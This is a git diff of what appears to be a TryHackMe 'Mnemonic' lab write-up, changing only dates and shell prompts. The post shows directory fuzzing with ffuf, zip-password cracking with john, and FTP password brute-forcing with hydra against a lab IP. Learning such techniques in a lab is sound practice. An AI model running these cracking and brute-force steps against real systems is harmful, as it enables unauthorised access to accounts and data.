@@ -1,7 +1,7 @@
 ---
 layout: post
 title: Mnemonic
-date: 2020-10-1 00:00:01 +5:30
+date: 2020-12-19 00:00:01 +5:30
 categories: [TryHackMe, Medium]
 tags: [osint, dirbust, code-analysis] # add tag
 image: /assets/img/mnemonic/mnem.png
@@ -58,7 +58,7 @@ so we have robots.txt it directs us to webmasters.
 For moving forward we have a way we can fuzz dir further
 
 ```bash
-argenestel@parrot  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/FUZZ
+root@kali  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/FUZZ
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -86,7 +86,7 @@ backups                 [Status: 301, Size: 327, Words: 20, Lines: 10]
 
 So let's enum more.
 
- root@parrot  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/backups/FUZZ.zip
+ root@kali  ~/Desktop/tryhackme/mnemonic  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.148.195/webmasters/backups/FUZZ.zip
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -120,13 +120,13 @@ Ahh the zip seems encrypted.
 So john have script which converts zip to john hash format and john can crack that.
 
 ```bash
-root@parrot  ~/Desktop/tryhackme/mnemonic  john --wordlist=/usr/share/wordlists/rockyou.txt john.hash
+root@kali  ~/Desktop/tryhackme/mnemonic  john --wordlist=/usr/share/wordlists/rockyou.txt john.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 <redacted>         (backups.zip/backups/note.txt)
-1g 0:00:00:02 DONE (2020-09-28 16:02) 0.4115g/s 5872Kp/s 5872Kc/s 5872KC/s 0050cent..0012093760
+1g 0:00:00:02 DONE (2020-12-19 16:02) 0.4115g/s 5872Kp/s 5872Kc/s 5872KC/s 0050cent..0012093760
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
@@ -135,10 +135,10 @@ In zip we can see user info and get username.
 Now Bruteforce the ftp pass.
 
 ```bash
-root@parrot  ~/Desktop/tryhackme/mnemonic/backups  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.148.195
+root@kali  ~/Desktop/tryhackme/mnemonic/backups  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.148.195
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-28 16:20:23
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-19 16:20:23
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
 [DATA] attacking ftp://10.10.148.195:21/
 [STATUS] 241.00 tries/min, 241 tries in 00:01h, 14344158 to do in 991:60h, 16 active
